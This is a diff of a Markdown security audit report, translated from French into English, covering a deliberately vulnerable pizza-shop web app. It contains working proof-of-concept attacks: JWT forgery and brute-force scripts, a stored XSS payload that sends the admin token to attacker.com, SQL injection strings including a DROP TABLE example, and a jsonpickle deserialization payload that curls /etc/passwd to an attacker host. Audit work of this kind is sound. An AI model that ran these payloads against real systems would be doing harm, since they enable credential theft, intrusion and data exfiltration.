@@ -20,17 +20,19 @@
       - [Validation Issues](#validation-issues)
     - [Identity Usurpation](#identity-usurpation)
       - [IDOR](#idor)
-      - [SSRF via Image URLs (CWE-918)](#ssrf-via-image-urls-cwe-918)
-      - [Route Guard Bypass on Client-Side Checks (CWE-602)](#route-guard-bypass-on-client-side-checks-cwe-602)
-      - [Weak Admin Guard and Role Bypass (CWE-269)](#weak-admin-guard-and-role-bypass-cwe-269)
-      - [Bearer Token Bypass \& Algorithm Confusion (CWE-347)](#bearer-token-bypass--algorithm-confusion-cwe-347)
-      - [Mitm via Insecure CORS \& HTTP Origins (CWE-319)](#mitm-via-insecure-cors--http-origins-cwe-319)
-      - [Nginx Reverse Proxy Misconfiguration](#nginx-reverse-proxy-misconfiguration)
-      - [Cleartext Credential or Token Interception](#cleartext-credential-or-token-interception)
-      - [Privilege Escalation: Self-Role Modification (CWE-269)](#privilege-escalation-self-role-modification-cwe-269)
-      - [Timing Attack Lure Vulnerability (CWE-697, CWE-208)](#timing-attack-lure-vulnerability-cwe-697-cwe-208)
+      - [SSRF via Image URLs](#ssrf-via-image-urls)
+      - [Route Guard Bypass on Client-Side Checks](#route-guard-bypass-on-client-side-checks)
+      - [Bearer Token Bypass \& Algorithm Confusion](#bearer-token-bypass--algorithm-confusion)
+      - [Mitm via Insecure CORS \& HTTP Origins](#mitm-via-insecure-cors--http-origins)
+      - [Cleartext Credential or Token Interception via Nginx Reverse Proxy Misconfiguration](#cleartext-credential-or-token-interception-via-nginx-reverse-proxy-misconfiguration)
+      - [Privilege Escalation: Self-Role Modification](#privilege-escalation-self-role-modification)
+      - [Timing Attack Lure Vulnerability](#timing-attack-lure-vulnerability)
     - [Data Exposure](#data-exposure)
+      - [Unrestricted Data Access via Unfiltered Endpoints](#unrestricted-data-access-via-unfiltered-endpoints)
+      - [Missing 404 Route and Predictable Error Handling](#missing-404-route-and-predictable-error-handling)
+      - [Exposed Source Maps, Debug Info and Server Metadata](#exposed-source-maps-debug-info-and-server-metadata)
     - [Supply Chain Vulnerabilities](#supply-chain-vulnerabilities)
+  - [General Recommendations](#general-recommendations)
 
 
 &nbsp;  
@@ -169,48 +171,22 @@ Recommended report ordering:
 ## Phase 1: SAST and manual analysis
 ### Insecure Credentials
 #### Hardcoded Secrets
-- **Gravité:** Critique
- - **Référence:** CWE-798 - Use of Hard-coded Credentials: https://cwe.mitre.org/data/definitions/798.html
-- **Constat:** Plusieurs secrets sensibles sont codés en dur dans l'orchestration Docker et dans la configuration applicative.
-  - JWT secret statique: `SuperSecretKeyThatIsTottalyNotRandom` (MyPizzaApp/docker-compose.yml)
-  - URL de base de données avec identifiants en clair: `postgresql+asyncpg://awefull_pizza_shop:awefull_password@postgres/awefullpizzashop` (MyPizzaApp/docker-compose.yml)
-  - Mot de passe PostgreSQL en clair: `POSTGRES_PASSWORD: awefull_password` (MyPizzaApp/docker-compose.yml)
-  - Valeur par défaut de secours côté backend: `JWT_SECRET_KEY = "changeme"`  (MyPizzaApp\backend\src\awefull_pizza_shop\webserver\config.py)
+- **Severity:** Critical
+ - **RReference:** [CWE-798 - Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html) & [CWE-1392 - Default Credentials in Configuration](https://cwe.mitre.org/data/definitions/1392.html)
+- **Constat:** Multiple hardcoded secrets in Docker and the application code, including JWT secrets and database credentials.
+  - *MyPizzaApp/docker-compose.yml*: 
+    - Static JWT: `SuperSecretKeyThatIsTottalyNotRandom`
+    - DB URL with credentials: `postgresql+asyncpg://awefull_pizza_shop:awefull_password@postgres/awefullpizzashop`
+    - PostgreSQL password: `POSTGRES_PASSWORD: awefull_password`
+  - *MyPizzaApp\backend\src\awefull_pizza_shop\webserver\config.py*:
+    - Static JWT: `JWT_SECRET_KEY = "changeme"`
+  - *MyPizzaApp\frontend\AwefullPizzaShop\src\environments\environment.prod.ts*:
+    - Static JWT: `jwtSecret: "SuperSecretKeyThatIsTottalyNotRandom"`
+  - *MyPizzaApp\backend\alembic.ini*:
+    - Exposed DB credentials in config file: `sqlalchemy.url = postgresql+asyncpg://awefull_pizza_shop:awefull_password@postgres/awefullpizzashop`
 - **Impact:**
-  - Forge de JWT possible en cas d'accès au code/config (boîte blanche, fuite repo, backup, logs).
-  - Mouvement latéral facilité vers la base de données.
-- **Remédiation:**
-  - Supprimer tout secret du dépôt.
-  - Injecter les secrets via variables d'environnement/secret manager.
-  - Rotation immédiate des secrets exposés.
-  - Interdire les valeurs faibles par défaut en production
-
-1. **backend/.../security/service.py: hash bcrypt hardcodé**
-   - **Verdict:** À nuancer (faux positif partiel)
-   - **Pourquoi:** La constante `PROTECTION_AGAINST_TIMING_ATTACK` ressemble à un hash de mot de passe, mais elle sert de valeur factice pour uniformiser le temps de vérification en cas d'utilisateur inconnu.
-   - **Risque réel:** Faible à modéré ici (pas un secret opérationnel), mais l'alerte reste pertinente d'un point de vue gouvernance (chaîne codée en dur).
-   - **Remédiation:**
-     - Documenter explicitement cette constante comme leurre anti-timing.
-     - Optionnel: déplacer en configuration non sensible ou générer au démarrage.
-
-2. **docker-compose.yml: mot de passe PostgreSQL en dur**
-   - **Verdict:** Confirmé (Blocker)
-   - **Pourquoi:** Credentials DB et secret JWT en clair dans compose.
-   - **Remédiation:**
-     - Utiliser des variables d'environnement externes (`.env` non versionné) ou Docker secrets.
-     - Rotation des secrets existants.
-
-
-- **Gravité:** Haute
-- **Référence:** CWE-1392 - Default Credentials in Configuration: https://cwe.mitre.org/data/definitions/1392.html
-- **Constat:** 
-  - `config.py` line 42: `JWT_SECRET_KEY: str = "changeme"` — weak default secret
-  - `alembic.ini` line 17: Exposed DB credentials in config file
-  - Docker Compose: `POSTGRES_PASSWORD=awefull_password` — trivial default
-- **Impact:**
-  - JWT tokens are trivially forgeable with default secret
-  - Database credentials discoverable in version control
-  - Any actor with code access can generate valid admin tokens
+  - JWT forgery possible in case of access to code/config (white-box, repo leak, backup, logs).
+  - Lateral movement facilitated towards the database.
 - **PoC:**
   ```python
   import jwt
@@ -218,16 +194,16 @@ Recommended report ordering:
   token = jwt.encode(payload, "changeme", algorithm="HS256")
   # Token now valid for all admin endpoints
   ```
-- **Remédiation:**
-  - Remove all default credentials from code
-  - Inject secrets via environment variables only (raise error if missing)
-  - Use `.env.example` as template without actual values
-  - Implement config validation rejecting weak defaults at startup
+- **Remediation:**
+  - Remove all hardcoded secrets from code and config.
+  - Use environment variables or a secrets manager for sensitive values.
+  - Rotate secrets after remediation and monitor for leaks.
+  - Enforce strong, random secrets with sufficient entropy (e.g., `secrets.token_hex(32)` for JWT).
 
-
+&nbsp;  
 #### Weak JWT Design and Role-in-Token Trust
-- **Gravité:** Critique
-- **Référence:** CWE-345 - Insufficient Verification of Data Authenticity: https://cwe.mitre.org/data/definitions/345.html
+- **Severity:** Critical
+- **RReference:** [CWE-345 - Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
 - **Constat:**
   - `xss-poller.mjs` explicitly signs a token with `{'sub': 'username:admin_user', 'role': 'Admin'}`.
   - The Angular frontend decodes the JWT client-side and trusts the `role` claim in `AdminGuard`.
@@ -238,14 +214,15 @@ Recommended report ordering:
 - **PoC:**
   - Edit `localStorage.access_token` with any JWT containing `role: Admin` and refresh the page.
   - The frontend admin navigation and route guard will accept it if the token parses.
-- **Remédiation:**
+- **Remediation:**
   - Treat JWT claims as untrusted hints on the client.
   - Enforce authorization on the server for every privileged action.
   - Keep the token minimal and avoid relying on the UI role for anything security-critical.
 
+&nbsp;  
 #### Weak Token Storage in localStorage
-- **Gravité:** Critique
-- **Référence:** CWE-922 - Insecure Storage of Sensitive Information: https://cwe.mitre.org/data/definitions/922.html
+- **Severity:** Critical
+- **RReference:** [CWE-922 - Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)
 - **Constat:**
   - `auth.service.ts` stores `access_token` in `localStorage`.
   - Any XSS payload or malicious extension can read it.
@@ -257,22 +234,19 @@ Recommended report ordering:
   ```javascript
   console.log(localStorage.getItem('access_token'));
   ```
-- **Remédiation:**
+- **Remediation:**
   - Prefer HttpOnly secure cookies for session material.
   - If storage is unavoidable, reduce token lifetime and rotate often.
   - Never expose long-lived admin tokens to frontend JavaScript.
 
+&nbsp;  
 #### Weak Cryptography & Guessable Hashes (CWE-327, CWE-330)
-- **Gravité:** Élevée
-- **Référence:** CWE-327 - Use of a Broken or Risky Cryptographic Algorithm: https://cwe.mitre.org/data/definitions/327.html
+- **Severity:** High
+- **Reference:** [CWE-327 - Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
 - **Constat:**
   - JWT Algorithm: HS256 (symmetric) with weak secret (~32 bits entropy vs 256+ recommended)
   - JWT Secret: `"SuperSecretKeyThatIsTottalyNotRandom"` (dictionary phrase, human-guessable)
   - No rate limiting on token generation or password verification
-- **Impact:**
-  - Brute-force JWT secret offline or via dictionary attack
-  - Forge unlimited valid tokens once secret is known
-  - Potential GPU-based password hash cracking if bcrypt cost is weak
 - **PoC:**
   ```bash
   # Offline brute-force with wordlists
@@ -282,187 +256,115 @@ Recommended report ordering:
     python3 -c "import jwt; print(jwt.encode({'role':'Admin'}, '$secret', 'HS256'))"
   done
   ```
-- **Remédiation:**
+- **Impact:**
+  - Brute-force JWT secret offline or via dictionary attack
+  - Forge unlimited valid tokens once secret is known
+  - Potential GPU-based password hash cracking if bcrypt cost is weak
+- **Remediation:**
   - Use RS256 (asymmetric) with 2048+ bit RSA keys or EdDSA
   - If HS256 required, enforce 256-bit random secret: `secrets.token_hex(32)`
   - Enforce bcrypt cost >= 13
   - Implement rate limiting on `/token` endpoint (max 5 attempts/minute)
   - Add secret rotation strategy
 
+&nbsp;  
+&nbsp;  
 ### Unexpected Content Injection
 #### XSS
-- **Gravité:** Élevée
- - **Référence (XSS):** CWE-79 - Cross-site Scripting: https://cwe.mitre.org/data/definitions/79.html
-- **Constat 1: chaîne d'attaque XSS stockée + bot admin**
-  - Les commentaires utilisateurs acceptent du HTML arbitraire.
-  - Le frontend force l'affichage via `bypassSecurityTrustHtml`.
-  - À chaque création de commentaire, le backend déclenche un bot qui visite la page pizza avec un token admin injecté dans localStorage.
-- **Preuves (code):**
-  - `MyPizzaApp/frontend/AwefullPizzaShop/src/app/pizza/pizza-comment-card/pizza-comment-card.component.ts`
-  - `MyPizzaApp/frontend/AwefullPizzaShop/src/app/pizza/pizza-comment-card/pizza-comment-card.component.html`
-  - `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/comment.py`
-  - `MyPizzaApp/xss-poller.mjs`
-- **Impact:**
-  - Vol de session admin via payload XSS (lecture de `localStorage.access_token`).
-  - Prise de contrôle des endpoints admin.
-
-3. **frontend/.../pizza-comment-card.component.ts: désactivation de sanitization Angular**
-    - **Référence (XSS guidance):** OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html
-   - **Verdict:** Confirmé (Blocker)
-   - **Pourquoi:** `bypassSecurityTrustHtml` appliqué sur du contenu utilisateur.
-   - **Impact:** XSS stockée exploitable, aggravée par le bot admin.
-   - **Remédiation:**
-     - Ne pas utiliser `bypassSecurityTrustHtml` pour des données non fiables.
-     - Utiliser rendu texte ou sanitization stricte côté serveur.
-
-
-- **Gravité:** Média
-- **Référence:** CWE-79 - Cross-site Scripting: https://cwe.mitre.org/data/definitions/79.html
+- **Severity:** Critical
+ - **Reference:** [CWE-79 - Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html) & [CWE-306 - Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
 - **Constat:**
-  - If `image_url` rendered directly in HTML (e.g., `<img src="{image_url}" />`), JavaScript URLs can be injected
-  - Example: `image_url="javascript:alert('XSS')"`
-- **Impact:**
-  - XSS execution on image load/error
-  - Token theft, page modification, user redirect
+  - `MyPizzaApp/frontend/AwefullPizzaShop/src/app/pizza/pizza-comment-card/pizza-comment-card.component.html` and `.ts` render user comments with `bypassSecurityTrustHtml` without sanitization (c.f. [Validation Issues](#validation-issues)).
+  - At comment creation, `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/comment.py`, calls a bot which visits the pizza page with an admin token injected into localStorage. The bot is exposed via `MyPizzaApp/xss-poller.mjs` on a public `GET /:id` endpoint without authentication or request validation.
 - **PoC:**
-  ```bash
-  curl -X POST http://localhost:7465/pizza/create \
-    -d '{"image_url":"javascript:alert(document.cookie)",...}'
-  ```
-- **Remédiation:**
-  - Validate image_url to ONLY allow `http://`, `https://` schemes
-  - Reject `javascript:`, `data:`, `vbscript:`, etc.
-  - Use Pydantic `HttpUrl` validator
-  - Render safely in Angular with DomSanitizer
-
-
-- **Gravité:** Critique
-- **Référence:** CWE-79 - Cross-site Scripting: https://cwe.mitre.org/data/definitions/79.html
-- **Constat:**
-  - `pizza-comment-card.component.ts` uses `bypassSecurityTrustHtml` on user content.
-  - `pizza-comment-card.component.html` binds that value via `[innerHTML]`.
-  - The mock comments already contain a working script payload.
-- **Impact:**
-  - Stored XSS against any user who opens the comment view.
-  - The payload can steal `access_token` from `localStorage` and trigger the admin bot.
-- **PoC:**
-  - Render the mock comment containing `<script>alert('XSS')</script>` and observe execution if sanitization is bypassed.
-- **Remédiation:**
-  - Remove `bypassSecurityTrustHtml` for untrusted input.
-  - Render comments as plain text or sanitize on the server with a strict allowlist.
-
-- **Gravité:** Critique
-- **Référence:** CWE-306 - Missing Authentication for Critical Function: https://cwe.mitre.org/data/definitions/306.html
-- **Constat:**
-  - `xss-poller.mjs` exposes a public `GET /:id` endpoint.
-  - The handler launches a browser, injects an admin JWT into `localStorage`, and visits `/pizza/${id}` without any authentication or authorization.
-  - `Dockerfile-XSS-poller` builds the bot as a standalone service, making it easy to run in the challenge environment.
+  1. Create a comment with the payload: `<script>fetch('http://attacker.com/steal?cookie='+localStorage.getItem('access_token'))</script>`
+  2. When the bot visits the page, it executes the script and sends the admin token to the attacker's server.
+  3. The attacker can then use this token to access admin routes or trigger server-side exploits.
 - **Impact:**
   - Any attacker who can reach the service can make the admin bot browse arbitrary pizza pages.
-  - This is the force multiplier for stored XSS and comment injection payloads.
-- **PoC:**
-  ```bash
-  curl http://localhost:3000/123
-  ```
-  - The bot opens the page and carries an admin token in browser storage.
+  - Admin session theft via XSS (`localStorage.access_token` read).
+  - Full admin interface access and potential server compromise via bot abuse.
 - **Remédiation:**
   - Protect the bot endpoint with authentication and request validation.
   - Restrict it to trusted internal callers only.
   - Never expose privileged browsing automation on a public interface.
 
 
+&nbsp;  
 #### SQLi
-- **Gravité:** Haute
- - **Référence:** CWE-89 - SQL Injection: https://cwe.mitre.org/data/definitions/89.html
-- **Constat:** Injection SQL via concaténation de la variable utilisateur `category` dans une clause SQL textuelle.
-- **Preuves (code):**
-  - `MyPizzaApp/backend/src/awefull_pizza_shop/database/pizza/repository.py`
-    - `text(f"category='{category}'")`
-  - Endpoint exposé:
-    - `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/pizza.py`
-    - route: `/pizza/category/{category}`
-- **PoC (exemple):**
-  - Requête sur `/api/pizza/category/meat'%20OR%201=1--`
-  - Effet attendu: contournement du filtre de catégorie et retour d'un plus grand jeu de résultats.
-- **Impact:**
-  - Exfiltration de données de la table ciblée.
-  - Contournement de logique applicative basée sur les filtres.
-- **Remédiation:**
-  - Supprimer la construction SQL manuelle.
-  - Utiliser une requête paramétrée/ORM safe:
-    - comparer directement `Pizza.category == category` après validation stricte de l'énumération.
-  - Rejeter les catégories hors liste blanche (`MEAT`, `FISH`, `VEGAN`).
-
-#### Command Injection
-- **Gravité:** Critique (via primitive équivalente RCE)
- - **Référence (Deserialization):** CWE-502 - Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
-- **Constat:** Pas de `os.system`/`subprocess` directement exposé avec entrée utilisateur, mais présence d'une désérialisation dangereuse menant à exécution potentielle de code.
-- **Preuves (code):**
-  - `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/pizza.py`
-    - `jsonpickle.decode(await request.body(), safe=False)`
-  - Couplage frontend orienté objet Python:
-    - `MyPizzaApp/frontend/AwefullPizzaShop/src/app/pizza/pizza.service.ts`
-    - ajout de méta-clés `jsonpickle` pour créer des objets côté serveur
-- **Impact:**
-  - Exécution de code arbitraire côté backend (RCE) possible selon payload de désérialisation.
-  - Compromission complète de l'application et pivot système.
-- **Remédiation:**
-  - Supprimer complètement `jsonpickle.decode(..., safe=False)` sur des données non fiables.
-  - Accepter un schéma JSON strict via Pydantic (`PizzaCreation`) sans polymorphisme dynamique.
-  - Refuser toute méta-clé de sérialisation (ex: `py/object`, `py/reduce`, etc.).
-
-#### Validation Issues
-Unsafe Deserialization (CWE-502)
-- **Source:** Snyk Code (python/Deserialization)
-- **Severity:** High (Priority Score 757)
-- **Résumé:** Unsanitized input from an HTTP parameter flows into `jsonpickle.decode`, enabling unsafe deserialization.
-- **Preuves (code):**
-  - `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/pizza.py`
-    - `pizza_data = jsonpickle.decode(await request.body(), safe=False)`
-- **Contexte:**
-  - This endpoint is protected by `validate_user_admin`, but an admin token can be stolen (see XSS + xss-poller chain). Unsafe deserialization here enables creating objects that may trigger code execution server-side.
-- **PoC (concept):**
-  - Construct a JSON payload containing a `py/object` tag or other jsonpickle gadget payload that, when deserialized, invokes a pickler/unpickler path which executes arbitrary code. POST to `/api/pizza/create` with admin auth.
-- **Impact:**
-  - Remote code execution as the application process user; full compromise of app container and pivot to infra.
-- **Immediate Mitigations:**
-  - Restrict access to the endpoint by IP/network in addition to auth where possible.
-  - Disable `jsonpickle.decode(..., safe=False)` in runtime (return 400/422 on presence of suspicious keys).
-  - Monitor and rotate admin credentials and JWT secret after remediation.
-- **Remediation (recommended):**
-  - Replace jsonpickle-based deserialization with a safe path:
-    - Accept plain JSON and validate/parse with Pydantic models (e.g., `schemas.PizzaCreation.model_validate_json()`), avoiding dynamic class instantiation.
-    - If jsonpickle must be used temporarily, enable/implement a strict allowlist of classes and block `py/*` tags; better yet, remove it.
-  - Add request schema validation (FastAPI body model) so malformed/malicious payloads are rejected by the framework before any deserialization.
-
-- **Gravité:** Critique
-- **Référence:** CWE-20 - Improper Input Validation: https://cwe.mitre.org/data/definitions/20.html
-- **Constat:**
-  - Pizza creation and editing accept free-form `name`, `description`, `imageUrl`, and `category` values.
-  - User edition accepts `email`, `name`, and `role` through `user-edit-dialog.component.ts`.
-  - Login and register flows submit values with weak front-end validation only.
-  - The UI does not enforce server-safe allowlists before sending content that can later be rendered or processed.
-- **Impact:**
-  - Stored XSS payloads can enter comments or descriptions.
-  - Malicious image URLs can be used for SSRF or JavaScript URL tricks.
-  - User-role tampering becomes possible when paired with weak backend authorization.
+- **Severity:** High
+ - **Reference:** [CWE-89 - SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
+- **Constat:** SQL injection via the category filter in the pizza listing endpoint. The code constructs a raw SQL query with string interpolation instead of using parameterized queries or ORM filtering. It is exposed on `/pizza/category/{category}` and is ran in `MyPizzaApp/backend/src/awefull_pizza_shop/database/pizza/repository.py` at `text(f"category='{category}'")`.
 - **PoC:**
-  - Submit payloads such as `<script>alert(1)</script>` in comments or `javascript:alert(1)` in image fields.
-  - If backend validation is weak, the payload persists and later executes in the browser.
-- **Remédiation:**
-  - Validate all fields server-side with strict allowlists.
-  - Mirror the validation in Angular, but do not rely on it for security.
-  - Reject dangerous URL schemes and HTML in free-text fields that are rendered as markup.
+  - Query the endpoint: `/api/pizza/category/meat'%20OR%201=1--`
+  - This would result in a SQL query like: `SELECT * FROM pizza WHERE category='meat' OR 1=1--'`, which returns all pizzas regardless of category.
+- **Impact:**
+  - Data exfiltration: an attacker can retrieve all pizza records, including sensitive information if present.
+  - Potential for more destructive SQLi payloads if the database user has write permissions (e.g., `'; DROP TABLE pizza;--`).
+- **Remediation:**
+  - Use parameterized queries or ORM filtering instead of raw SQL string interpolation.
+  - Whitelist allowed categories and validate input against it before querying.
+
+&nbsp;  
+#### Command Injection
+- **Severity:** Critical, P0
+ - **Reference:** [CWE-502 - Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
+- **Constat:** `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/pizza.py` deserialize untrusted input from the request body using `jsonpickle.decode(..., safe=False)`. This allows for unsafe deserialization of arbitrary objects, which can lead to remote code execution if a malicious payload is crafted and sent to the `/api/pizza/create` endpoint with admin authentication.
+- **Impact:**
+  - An attacker with admin access can send a specially crafted JSON payload that, when deserialized, executes arbitrary code on the server.
+- **PoC:**
+  - Call the pizza creation endpoint with a crafted JSON payload that includes `py/object` or other jsonpickle gadget to trigger code execution. For example:
+  ```json
+  {
+    "name": "EvilPizza",
+    "description": "This is a malicious pizza",
+    "price": 9.99,
+    "image_url": "http://attacker.com/evil.jpg",
+    "category": "MEAT",
+    "py/object": "os.system",
+    "args": ["curl http://attacker.com/steal?data=$(cat /etc/passwd)"]
+  }
+  ```
+   - This payload would execute the `curl` command on the server, sending the contents of `/etc/passwd` to the attacker's server.
+- **Remediation:**
+  - Delete `jsonpickle.decode()` call on untrusted data.
+  - Enforce a strict schema validation for pizza creation using Pydantic models, rejecting any payload that contains suspicious keys or structures.
+
+&nbsp;  
+#### Validation Issues
+- **Severity:** Very High
+- **Reference:** [CWE-20 - Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html) & [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
+- **Constat:**
+  - `pizza-comment-card.component.ts` uses `bypassSecurityTrustHtml` on user-generated comments without sanitization and renders them with `[innerHTML]` in `pizza-comment-card.component.html`.
+  - Pizza creation and editing accept free-form `name`, `description`, `imageUrl`, and `category` values without server-side validation.
+  - User edition accepts `email`, `name`, and `role` through `user-edit-dialog.component.ts` without strict validation or ownership checks.
+  - Login and register flows submit values with weak front-end validation only.
+  - The UI does not enforce server-safe allowlists before sending content that can later be rendered or processed, leading to multiple injection points (XSS, SSRF, role tampering).
+- **Impact:**
+  - Stored XSS in comments can lead to admin token theft and bot abuse since it is rendered with `bypassSecurityTrustHtml`.
+  - Unvalidated pizza fields can lead to SSRF or XSS if rendered unsafely.
+  - User role tampering can lead to privilege escalation if backend checks are weak.
+  - If `image_url` is rendered directly in HTML, it can lead to XSS via `javascript:` URLs.
+- **PoC:**
+  - Submit a comment with `<script>alert('XSS')</script>` and observe whether it executes when the admin bot visits the page.
+  - Submit a pizza with `image_url` set to `javascript:alert('XSS')` and observe whether it executes when rendered.
+- **Remediation:**
+  - Implement strict server-side validation for all user inputs with allowlists.
+  - Remove `bypassSecurityTrustHtml` and render comments as plain text or sanitize them on the server with a strict allowlist of tags and attributes.
+  - Render `image_url` safely by validating it to only allow `http://` and `https://` schemes, and using Angular's DomSanitizer properly. 
 
 
+&nbsp;  
+&nbsp;  
 ### Identity Usurpation
 #### IDOR
-- **Gravité:** Haute
-- **Référence:** CWE-639 - Authorization Bypass Through User-Controlled Key: https://cwe.mitre.org/data/definitions/639.html
+- **Severity:** High
+- **Reference:** [CWE-639 - Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
 - **Constat:**
-  - `backend/src/awefull_pizza_shop/webserver/routers/user.py` line 18: `/users/{user_id}` returns user by ID without ownership check
-  - Line 27: `/users/{user_id}` POST allows updating ANY user with only admin role check
-  - No validation: `if current_user.id != target_user_id and current_user.role != ADMIN: raise 403`
+  - `backend/src/awefull_pizza_shop/webserver/routers/user.py`
+    - returns the user ID without ownership check at `/users/{user_id}`
+    - POST `/users/{user_id}`allows updating ANY user with only admin role check
+    - No validation: `if current_user.id != target_user_id and current_user.role != ADMIN: raise 403`
 - **Impact:**
   - Enumerate all users via sequential requests: `/api/users/550e8400-e29b-41d4-a716-000000000001`
   - Extract emails, roles, metadata without authentication
@@ -474,18 +376,19 @@ Unsafe Deserialization (CWE-502)
   curl http://localhost:7465/users/550e8400-e29b-41d4-a716-446655440000 \
     -H "Authorization: Bearer <normal_user_token>"
   ```
-- **Remédiation:**
+- **Remediation:**
   - Add strict ownership checks in update endpoint
   - Prevent role changes by unprivileged users
   - Paginate or rate-limit ID enumeration
   - Log suspicious sequential access patterns
 
-#### SSRF via Image URLs (CWE-918)
-- **Gravité:** Média-Haute
-- **Référence:** CWE-918 - Server-Side Request Forgery: https://cwe.mitre.org/data/definitions/918.html
+&nbsp;  
+#### SSRF via Image URLs
+- **Severity:** High
+- **Reference:** [CWE-918 - Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
 - **Constat:**
-  - `schemas/pizza.py` line 17: `image_url: str` with NO validation
   - Pizza endpoints accept ANY URL without protocol or domain checking
+  - `schemas/pizza.py` doesn't validate `image_url: str`
   - Backend/bots may fetch these URLs, exposing internal network
 - **Impact:**
   - File URL exfiltration: `file:///etc/passwd`, `file:///root/.ssh/id_rsa`
@@ -505,16 +408,18 @@ Unsafe Deserialization (CWE-502)
     }'
   # When bot or user fetches this, file content may be exposed
   ```
-- **Remédiation:**
+- **Remediation:**
   - Whitelist URL schemes: only `http://` and `https://`
   - Reject `javascript:`, `data:`, `file://`, `gopher://`, `dict://`, etc.
   - Validate domain against allowlist (e.g., CDN domains only)
   - Implement timeout and size limits on URL fetches
   - Use Pydantic `HttpUrl` validator for stricter validation
 
-#### Route Guard Bypass on Client-Side Checks (CWE-602)
-- **Gravité:** Haute
-- **Référence:** CWE-602 - Client-Side Enforcement of Server-Side Security: https://cwe.mitre.org/data/definitions/602.html
+
+&nbsp;  
+#### Route Guard Bypass on Client-Side Checks
+- **Severity:** High
+- **Reference:** [CWE-602 - Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html)
 - **Constat:**
   - `AuthGuard` only checks `localStorage` presence through `isLoggedIn()`.
   - `AdminGuard` only checks the decoded JWT payload.
@@ -525,36 +430,18 @@ Unsafe Deserialization (CWE-502)
 - **PoC:**
   - Set any non-empty string in `localStorage.access_token` and refresh.
   - If `getUserRole()` returns `Admin`, the admin route opens.
-- **Remédiation:**
+- **Remediation:**
   - Move trust to the backend and keep guards as UX only.
   - Fetch the current user profile from the server and verify it before rendering sensitive pages.
   - Clear state on decode errors instead of treating them as partial success.
 
-#### Weak Admin Guard and Role Bypass (CWE-269)
-- **Gravité:** Critique
-- **Référence:** CWE-285 - Improper Authorization: https://cwe.mitre.org/data/definitions/285.html
-- **Constat:**
-  - `admin.guard.ts` checks only `isLoggedIn()` and then trusts `getUserRole()` from the decoded JWT.
-  - The guard is purely client-side and can be bypassed by modifying storage or the token payload.
-  - The `AuthGuard` and `AdminGuard` only protect navigation, not the backend.
-- **Impact:**
-  - UI-only authorization can be bypassed without any server compromise.
-  - Attackers can directly call privileged endpoints even if the menu is hidden.
-- **PoC:**
-  - Replace the stored token with a forged one whose payload contains `role: Admin` and revisit `/admin`.
-- **Remédiation:**
-  - Keep route guards as convenience only.
-  - Enforce every privileged action on the server.
-  - Do not use decoded client-side claims as proof of authorization.
 
-#### Bearer Token Bypass & Algorithm Confusion (CWE-347)
-- **Gravité:** Média-Haute
-- **Référence:** CWE-347 - Improper Verification of Cryptographic Signature: https://cwe.mitre.org/data/definitions/347.html
+&nbsp;  
+#### Bearer Token Bypass & Algorithm Confusion
+- **Severity:** Low
+- **Reference:** [CWE-347 - Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
 - **Constat:**
-  - `security/service.py` line 49: `jwt.decode()` may accept multiple algorithms
-  - No explicit check that token's `alg` field matches expected algorithm
-  - Potential for `alg: "none"` (unsigned) token bypass
-  - Potential for algorithm confusion (HS256 vs RS256 if public key is known)
+  - In `security/service.py`, `jwt.decode()` may accept multiple algorithms risking algorithm confusion or unsigned tokens bypasses if not configured properly.
 - **Impact:**
   - Attacker supplies unsigned JWT (`alg: "none"`)
   - Attacker switches algorithm to one with known key (if keys are exposed)
@@ -567,16 +454,18 @@ Unsafe Deserialization (CWE-502)
   token = jwt.encode(payload, "", algorithm="none")
   # This might be accepted depending on configuration
   ```
-- **Remédiation:**
+- **Remediation:**
   - Enforce strict algorithm: `jwt.decode(..., algorithms=["HS256"])` ONLY
   - Verify `exp` (expiration) is validated
   - Reject tokens with `alg: "none"`
   - Use PyJWT 2.x with strict defaults
   - Verify algorithm matches exactly before processing
 
-#### Mitm via Insecure CORS & HTTP Origins (CWE-319)
-- **Gravité:** Média-Haute
-- **Référence:** CWE-319 - Cleartext Transmission of Sensitive Information: https://cwe.mitre.org/data/definitions/319.html
+
+&nbsp;  
+#### Mitm via Insecure CORS & HTTP Origins
+- **Severity:** High
+- **Reference:** [CWE-319 - Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
 - **Constat:**
   - `config.py` lines 44-46: Allowed CORS origins include `http://` (not HTTPS):
     ```python
@@ -596,7 +485,7 @@ Unsafe Deserialization (CWE-502)
   mitmproxy -p 7465
   # Intercept and steal Authorization headers
   ```
-- **Remédiation:**
+- **Remediation:**
   - Enforce HTTPS in production:
     ```python
     if not settings.DEBUG:
@@ -607,9 +496,11 @@ Unsafe Deserialization (CWE-502)
   - Remove all `http://` origins in production
   - Force HTTPS redirect
 
-#### Nginx Reverse Proxy Misconfiguration
-- **Gravité:** Moyenne à élevée
-- **Référence:** CWE-319 - Cleartext Transmission of Sensitive Information: https://cwe.mitre.org/data/definitions/319.html
+
+&nbsp;  
+#### Cleartext Credential or Token Interception via Nginx Reverse Proxy Misconfiguration
+- **Severity:** Low to Medium
